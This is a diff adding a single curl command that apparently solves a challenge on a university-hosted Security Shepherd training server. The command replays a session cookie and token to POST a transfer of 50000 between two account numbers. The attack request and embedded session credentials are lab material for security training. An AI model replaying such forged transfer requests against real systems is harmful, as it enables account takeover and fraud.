@@ -1,0 +1,19 @@
+curl 'https://shepherd.hs25.isf.hslu-edu.ch/challenges/1f0935baec6ba69d79cfb2eba5fdfa6ac5d77fadee08585eb98b130ec524d00cTransfer' \
+  -X POST \
+  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0' \
+  -H 'Accept: */*' \
+  -H 'Accept-Language: en-US,en;q=0.5' \
+  -H 'Accept-Encoding: gzip, deflate, br, zstd' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -H 'X-Requested-With: XMLHttpRequest' \
+  -H 'Origin: https://shepherd.hs25.isf.hslu-edu.ch' \
+  -H 'Connection: keep-alive' \
+  -H 'Referer: https://shepherd.hs25.isf.hslu-edu.ch/challenges/1f0935baec6ba69d79cfb2eba5fdfa6ac5d77fadee08585eb98b130ec524d00c.jsp' \
+  -H 'Cookie: JSESSIONID=F879DD8AE3AE8F1508D0E2202BC14F40; token=143391886440824118810249259784855369288' \
+  -H 'Sec-Fetch-Dest: empty' \
+  -H 'Sec-Fetch-Mode: cors' \
+  -H 'Sec-Fetch-Site: same-origin' \
+  -H 'DNT: 1' \
+  -H 'Sec-GPC: 1' \
+  -H 'TE: trailers' \
+  --data-raw 'senderAccountNumber=1581&recieverAccountNumber=1631&transferAmount=50000'
